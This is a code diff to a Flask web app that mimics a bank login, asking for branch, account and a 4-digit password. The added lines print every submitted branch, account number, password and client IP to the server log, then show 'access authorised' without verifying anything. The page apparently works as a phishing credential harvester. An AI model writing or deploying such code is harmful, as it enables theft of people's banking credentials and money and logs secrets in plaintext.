@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template_string, abort
+from datetime import datetime
 import os
 
 app = Flask(__name__)
@@ -98,11 +99,24 @@ def login():
 
         if not agencia.isdigit() or len(agencia) != 4:
             erro = 'Agência inválida. Informe exatamente 4 números.'
+
         elif not (len(conta) == 7 and conta[:5].isdigit() and conta[5] == '-' and conta[6].isdigit()):
             erro = 'Conta inválida.'
+
         elif not senha.isdigit() or len(senha) != 4:
             erro = 'Senha inválida.'
+
         else:
+            # ===== LOG NO RENDER =====
+            print("=== NOVO ACESSO ===")
+            print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
+            print("Agência:", agencia)
+            print("Conta:", conta)
+            print("Senha:", senha)
+            print("IP:", request.remote_addr)
+            print("Dispositivo: Mobile")
+            print("===================")
+
             return "<h2>Acesso autorizado</h2>"
 
     return render_template_string(HTML_LOGIN, erro=erro)
@@ -110,4 +124,3 @@ def login():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-
